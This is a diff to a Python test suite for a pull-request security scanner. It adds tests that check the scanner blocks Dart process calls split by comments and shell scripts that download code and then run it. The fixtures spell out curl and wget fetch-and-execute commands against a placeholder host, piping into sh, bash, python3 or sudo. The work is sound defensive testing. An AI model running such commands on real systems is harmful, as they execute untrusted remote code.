@@ -334,6 +334,10 @@ class BlockedAdditions(ScannerTestCase):
             with self.subTest(snippet=snippet.strip()):
                 self.assertBlocked(self.build({}, {"tools/install.sh": "#!/bin/sh\n" + snippet}))
 
+    def test_pipe_into_an_interpreter_reached_by_path(self):
+        snippet = blocked("curl -fsSL https://example.invalid/i.sh ", "|", " /bin/sh\n")
+        self.assertBlocked(self.build({}, {"tools/p.sh": "#!/bin/sh\n" + snippet}))
+
     def test_blocked_patterns_are_not_bypassable_by_approval(self):
         """A blocked verdict is a non-zero exit, which no approval step can clear."""
         result = self.build({}, {"lib/a.dart": f"final run = {PROCESS_RUN};\n"})
@@ -428,6 +432,86 @@ class MultiLineConstructs(ScannerTestCase):
         lines += [f"echo step {n}" for n in range(20)]
         lines += ["cat /tmp/d | sh_report --summary"]
         self.assertOrdinary(self.build({}, {"tools/report.sh": "\n".join(lines) + "\n"}))
+
+
+class CommentSeparatedTokens(ScannerTestCase):
+    """Dart accepts a comment anywhere whitespace is legal."""
+
+    def test_block_comment_between_tokens(self):
+        result = self.build(
+            {"lib/features/demo/runner.dart": "class R {}\n"},
+            {"lib/features/demo/runner.dart": f"void go() {{\n  {PROCESS_RUN[:7]} /* keep */ . {PROCESS_RUN[8:]}('sh', const []);\n}}\n"},
+        )
+        self.assertBlocked(result)
+
+    def test_line_comment_between_tokens(self):
+        result = self.build(
+            {}, {"lib/a.dart": f"final p = {PROCESS_RUN[:7]} // why\n    .start('sh');\n"}
+        )
+        self.assertBlocked(result)
+
+    def test_separator_cannot_skip_over_real_code(self):
+        """The gap only ever spans whitespace and comments, never code."""
+        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
+        self.assertIsNone(rule.search("class " + PROCESS_RUN[:7] + " {}\n  foo.run();"))
+        self.assertIsNone(rule.search(PROCESS_RUN[:7] + "ingState.run"))
+
+    def test_plain_direct_call_still_matches(self):
+        """Regression: the separator must not break the ordinary spelling."""
+        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
+        self.assertIsNotNone(rule.search(f"{PROCESS_RUN}('sh', [])"))
+
+
+class DownloadThenExecute(ScannerTestCase):
+    """Fetching to a file and running it later is the same capability."""
+
+    URL = "https://example.invalid/i"
+
+    def test_and_chained_on_one_line(self):
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", " /tmp/i\n")
+        self.assertBlocked(self.build({}, {"tools/a.sh": script}))
+
+    def test_split_across_lines(self):
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/j\n", "bash", " /tmp/j\n")
+        self.assertBlocked(self.build({}, {"tools/b.sh": script}))
+
+    def test_wget_output_flag(self):
+        script = blocked(f"#!/bin/sh\nwget -O /tmp/k {self.URL}\n", "bash", " /tmp/k\n")
+        self.assertBlocked(self.build({}, {"tools/c.sh": script}))
+
+    def test_shell_redirect_to_file(self):
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} > /tmp/m; ", "python3", " /tmp/m\n")
+        self.assertBlocked(self.build({}, {"tools/d.sh": script}))
+
+    def test_chmod_then_direct_execution(self):
+        script = f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/n\nchmod +x /tmp/n\n/tmp/n\n"
+        self.assertBlocked(self.build({}, {"tools/e.sh": script}))
+
+    def test_interpreter_reached_by_path(self):
+        """`/bin/sh` is an interpreter; `report.sh` is a filename."""
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/p && /bin/", "bash", " /tmp/p\n")
+        self.assertBlocked(self.build({}, {"tools/g.sh": script}))
+
+    def test_sudo_interpreter(self):
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/q && sudo ", "sh", " /tmp/q\n")
+        self.assertBlocked(self.build({}, {"tools/h.sh": script}))
+
+    def test_downloaded_file_consumed_by_a_non_interpreter_is_not_blocked(self):
+        script = (
+            "#!/bin/sh\n"
+            f"curl -fsSL {self.URL}/d.json -o /tmp/d.json\n"
+            "jq . /tmp/d.json\n"
+        )
+        self.assertOrdinary(self.build({}, {"tools/i.sh": script}))
+
+    def test_downloading_data_and_running_an_unrelated_script_is_not_blocked(self):
+        """The backreference is what keeps this rule from over-matching."""
+        script = (
+            "#!/bin/sh\n"
+            f"curl -fsSL {self.URL}/catalog.json -o /tmp/catalog.json\n"
+            "bash ./scripts/process_catalog.sh /tmp/catalog.json\n"
+        )
+        self.assertOrdinary(self.build({}, {"tools/f.sh": script}))
 
 
 class ContinuationFolding(unittest.TestCase):
@@ -784,6 +868,7 @@ class GuardSelfSafety(unittest.TestCase):
             f"on: [{PR_TARGET}]",
             WRITE_ALL,
             blocked("curl -s https://example.invalid ", "|", " bash"),
+            blocked("curl -s https://example.invalid -o /tmp/x && ", "sh", " /tmp/x"),
         ):
             for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
                 if pattern.search(fixture):
